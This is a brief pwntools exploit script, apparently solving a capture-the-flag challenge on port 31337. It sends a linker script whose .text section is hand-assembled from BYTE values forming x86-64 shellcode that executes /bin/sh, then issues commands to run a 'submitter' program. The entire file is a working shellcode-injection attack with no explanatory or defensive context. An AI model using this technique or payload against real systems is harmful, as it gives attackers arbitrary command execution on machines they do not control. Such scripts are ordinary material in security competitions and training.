#!/usr/bin/env python3
import time
from pwn import *
context.log_level = 'debug'
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
ldscript = """SECTIONS
{
  . = 0x1000;
  .text : { BYTE(0x48) BYTE(0x31) BYTE(0xf6) BYTE(0x56) BYTE(0x48) BYTE(0xbf) BYTE(0x2f) BYTE(0x62) BYTE(0x69) BYTE(0x6e) BYTE(0x2f) BYTE(0x2f) BYTE(0x73) BYTE(0x68) BYTE(0x57) BYTE(0x54) BYTE(0x5f) BYTE(0xb0) BYTE(0x3b) BYTE(0x99) BYTE(0x0f) BYTE(0x05) }
}

"""
time.sleep(2)
io.send(ldscript)
time.sleep(2)
io.send("./submitter\nexit\n")
print(io.recv())



